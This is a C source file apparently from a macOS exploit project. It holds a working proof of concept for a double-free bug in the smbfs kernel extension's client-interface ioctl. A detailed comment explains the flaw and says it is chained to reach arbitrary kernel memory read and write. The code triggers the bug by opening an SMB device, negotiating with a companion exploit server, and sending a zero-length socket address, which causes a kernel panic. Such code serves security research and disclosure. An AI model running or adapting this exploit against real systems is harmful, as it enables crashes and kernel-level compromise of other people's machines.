
#include <stdio.h>
#include <string.h>

#include <arpa/inet.h>
#include <IOKit/kext/KextManager.h>

#include <smbfs/smb_dev.h>
#include <smbfs/smb_dev_2.h>
#include <xpl_smbx/smbx_conf.h>

///
/// SMB 3.0 protocol allows clients to use multi channel feature to improve performance and fault
/// tolerance by establishing parallel connections to SMB server over different network interfaces.
/// For this, clients needs to know certain informations about various network interfaces in client
/// and server machine (like IPv4/IPv6 address, speed of NIC etc).
///
/// macOS supports mounting SMB shares using the `smbfs.kext` kernel extension. The
/// information about client network interfaces are provided to the kernel extension by the
/// `mc_notifier` process. This process constantly monitors the network interfaces in the client
/// machine and sends up to date information to `smbfs.kext` by executing `ioctl` syscall with
/// command type `SMBIOC_UPDATE_CLIENT_INTERFACES`
///
/// The `ioctl` requests on smb device is handled by the `nsmb_dev_ioctl` method in smb_dev.c.
/// For `SMBIOC_UPDATE_CLIENT_INTERFACES` ioctl commands, `nsmb_dev_ioctl` will pass
/// the request down to `smb2_mc_parse_client_interface_array` method which is reponsible for
/// reading the network interfaces from user memory and calling `smb2_mc_add_new_interface_info_to_list`
/// method to add each received interface into `session_table->client_nic_info_list`. The method
/// `smb2_mc_parse_client_interface_array` is defined as follows
///
/// int
/// smb2_mc_parse_client_interface_array(
///   struct session_network_interface_info* session_table,
///   struct smbioc_client_interface* client_info)
/// {
///   // Declare & intialize variables
///   ...
///   // Allocates memory for client_info_array
///   ...
///   // Copy the interface list from user space
///   ...
///
///   // Array of network_nic_info copied in from user memory
///   struct network_nic_info* client_info_entry = client_info_array;
///
///   for (uint32_t i = 0; i < client_info->interface_instance_count; i++) {
///     // Check for preventing OOB read
///     ...
///     // Check if network interfaces is in blacklist
///     bool in_blacklist = ...;
///
///     // Insert new network interface / update if already present
///     error = smb2_mc_add_new_interface_info_to_list(
///              &session_table->client_nic_info_list,
///              &session_table->client_nic_count,
///              client_info_entry,
///              0,
///              in_blacklist
///     );
///
///     // ***NOTE***: When `smb2_mc_add_new_interface_info_to_list` returns an error, all the interfaces in
///     // `session_table->client_nic_info_list` is released
///     if (error) {
///       SMBERROR("Adding new interface info ended with error %d!", error);
///       smb2_mc_release_interface_list(&session_table->client_nic_info_list);
///       break;
///     }
///
///     // Point `client_info_entry` to next element in `client_info_array`
///     client_info_entry = ...;
///     ...
///   }
///   exit:
///   // Free resources
///   ...
///   return error;
/// }
///
/// As noted in the code snippet above, when `smb2_mc_add_new_interface_info_to_list` returns
/// an error all interfaces in `session_table->client_nic_info_list` is released by calling
/// `smb2_mc_release_interface_list` method.
///
/// The `smb2_mc_add_new_interface_info_to_list` method is responsible for checking if an NIC
/// with same index is already present in the `client_nic_info_list`. If present, it updates the existing
/// NIC entry, else a new NIC entry in created and added to the list. Then it calls the method
/// `smb2_mc_update_info_with_ip` to associate new IP address with the NIC.
///
/// The method `smb2_mc_add_new_interface_info_to_list` is defined as follows
///
/// static int
///   smb2_mc_add_new_interface_info_to_list(
///   struct interface_info_list* list,
///   uint32_t* list_counter,
///   struct network_nic_info* new_info,
///   uint32_t rss_val,
///   bool in_black_list)
/// {
///   int error = 0;
///   uint64_t nic_index = ((uint64_t)rss_val << SMB2_IF_RSS_INDEX_SHIFT) | new_info->nic_index;
///
///   // If there is already a nic with same nic_index, use it
///   struct complete_nic_info_entry* nic_info = smb2_mc_get_nic_by_index(list, nic_index);
///   bool new_nic = false;
///   if (nic_info == NULL) { // Need to create a new nic element
///     new_nic = true;
///     // Allocates and intializes and new complete_nic_info_entry
///     ...
///   }
///
///   /* Update with the most recent data */
///   nic_info->nic_caps = new_info->nic_caps;
///   nic_info->nic_index = nic_index;
///   nic_info->nic_link_speed = new_info->nic_link_speed;
///   nic_info->nic_type = new_info->nic_type;
///   if (in_black_list) {
///     nic_info->nic_flags |= SMB2_MC_NIC_IN_BLACKLIST;
///   }
///
///   error = smb2_mc_update_info_with_ip(nic_info, &new_info->addr, NULL);
///
///   // ***NOTE***: Individual network interface is released when an error occurs
///   //                     but it is not removed from the `struct interface_info_list list`
///   if (error) {
///     SMBERROR("failed to smb2_mc_update_info_with_ip!");
///     smb2_mc_release_interface(NULL, nic_info, NULL);
///     nic_info = NULL;
///   }
///
///   if (!error && new_nic) {
///     // If it is a new nic, add it to the list
///     smb2_mc_insert_new_nic_by_speed(list, list_counter, nic_info, NULL);
///   }
///
///   // ***NOTE*** error is passed down to the caller `smb2_mc_parse_client_interface_array` method
///   return error;
/// }
///
/// As noted above, when `smb2_mc_update_info_with_ip` returns an error,  the individual network
/// interface is released by calling`smb2_mc_release_interface` method and the error is passed
/// down to the caller `smb2_mc_parse_client_interface_array` method. No attempt is made
/// to remove the released interface from  `list` tailq. For new NIC, this won't be a problem because
/// it is added to the `list` tailq only if `smb2_mc_update_info_with_ip` succeeds. But for existing NIC,
/// this will lead to the individual NIC from being released twice, once by `smb2_mc_update_info_with_ip`
/// and once by `smb2_mc_parse_client_interface_array`
///
/// The method `smb2_mc_update_info_with_ip` returns error `ENOMEM` when `MALLOC` of
/// size `addr->sa_len` returns `NULL`. The `addr->sa_len` is not validated and it can be zero.
/// `MALLOC` of size zero will return `NULL`. This will make the `smb2_mc_update_info_with_ip`
/// return an error which would trigger the double free vulnerability.
///
/// See POC below which will trigger the vulnerabiltiy and cause a kernel panic
///
/// This vulnerabilty is exploited in `xpl_kmem/smb_dev_rw.c` to obtain read write access to
/// `struct smb_dev` allocations in default.48 zone which inturn is used to achieve arbitary kernel
/// memory read write.
///


int smb_client_load_kext(void) {
    return KextManagerLoadKextWithIdentifier(CFSTR("com.apple.filesystems.smbfs"), NULL);
}


int smb_client_open_dev(void) {
    char path[PATH_MAX];
    for (int i=0; i<1024; i++) {
        snprintf(path, sizeof(path), "/dev/nsmb%x", i);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            return fd;
        }
    }
    return -1;
}


int main(int argc, const char * argv[]) {
    smb_client_load_kext();
    
    /// Socket address of xpl_smbx server
    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(XPL_SMBX_PORT);
    inet_aton(XPL_SMBX_HOST, &smb_addr.sin_addr);
    
    /// Open a new smb device (`/dev/nsmb*`)
    int smb_dev = smb_client_open_dev();
    if (smb_dev < 0) {
        printf("[ERROR] failed to open smb dev, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// Step 1:  Create a new session. A valid session is required for successfull execution of
    ///       `SMBIOC_UPDATE_CLIENT_INTERFACES` ioctl command
    struct smbioc_negotiate negotiate_req;
    bzero(&negotiate_req, sizeof(negotiate_req));
    negotiate_req.ioc_version = SMB_IOC_STRUCT_VERSION;
    negotiate_req.ioc_saddr = (struct sockaddr*)&smb_addr;
    negotiate_req.ioc_saddr_len = sizeof(smb_addr);
    negotiate_req.ioc_extra_flags |= SMB_FORCE_NEW_SESSION;
    negotiate_req.ioc_ssn.ioc_owner = getuid();
    negotiate_req.ioc_extra_flags |= SMB_SMB1_ENABLED;

    if (ioctl(smb_dev, SMBIOC_NEGOTIATE, &negotiate_req)) {
        printf("[ERROR] SMBIOC_NEGOTIATE ioctl failed, err: %s\n", strerror(errno));
        close(smb_dev);
        exit(1);
    }
    
    if (negotiate_req.ioc_errno) {
        printf("[ERROR] SMBIOC_NEGOTIATE returned non zero ioc_errno %d\n", negotiate_req.ioc_errno);
        printf("[ERROR] Make sure that xpl_smbx server is running\n");
        exit(1);
    }
    
    /// Step 2: Add a NIC to `sessionp->session_table.client_nic_info_list`
    struct network_nic_info nic_info;
    bzero(&nic_info, sizeof(nic_info));
    nic_info.nic_index = 1;
    nic_info.addr_4.sin_len = sizeof(struct sockaddr_in);
    nic_info.addr_4.sin_family = AF_INET;
    nic_info.addr_4.sin_port = htons(1234);
    inet_aton("127.0.0.1", &nic_info.addr_4.sin_addr);
    
    struct smbioc_client_interface update_req;
    bzero(&update_req,  sizeof(update_req));
    update_req.ioc_info_array = &nic_info;
    /// Number of NICs in `ioc_info_array`
    update_req.interface_instance_count = 1;
    /// Total size of NIC array in `ioc_info_array`
    update_req.total_buffer_size = sizeof(nic_info);
    
    if (ioctl(smb_dev, SMBIOC_UPDATE_CLIENT_INTERFACES, &update_req)) {
        printf("[ERROR] SMBIOC_UPDATE_CLIENT_INTERFACES ioctl failed, err: %s\n", strerror(errno));
        exit(1);
    }
    
    if (update_req.ioc_errno) {
        printf("[ERROR] SMBIOC_UPDATE_CLIENT_INTERFACES ioctl returned non zero ioc_errno: %d\n", update_req.ioc_errno);
        exit(1);
    }
    
    printf("[INFO] initial NIC added to client_nic_info_list\n");
    
    /// Step 3: Try to associate a socket address with length zero to NIC created in step 2.
    ///       This will trigger the double free vulnerability
    struct network_nic_info bad_nic_info;
    bzero(&bad_nic_info, sizeof(bad_nic_info));
    /// To trigger double free,  error must occur on an existing nic
    bad_nic_info.nic_index = nic_info.nic_index;
    /// This will cause SMB_MALLOC in `smb2_mc_update_info_with_ip` to return NULL
    /// `smb2_mc_update_info_with_ip` method will return ENOMEM
    bad_nic_info.addr_4.sin_len = 0;
    bad_nic_info.addr_4.sin_family = AF_INET;
    bad_nic_info.addr_4.sin_port = htons(1234);
    /// Use a different IP address so that `smb2_mc_does_ip_belong_to_interface`
    /// will return FALSE
    inet_aton("127.0.0.2", &bad_nic_info.addr_4.sin_addr);
    
    bzero(&update_req,  sizeof(update_req));
    update_req.interface_instance_count = 1;
    update_req.ioc_info_array = &bad_nic_info;
    update_req.total_buffer_size = sizeof(bad_nic_info);
    
    printf("[INFO] triggering double free vulnerability\n");
    /// Will trigger panic during second release attempt of the NIC
    ioctl(smb_dev, SMBIOC_UPDATE_CLIENT_INTERFACES, &update_req);
    
    return 0;
}
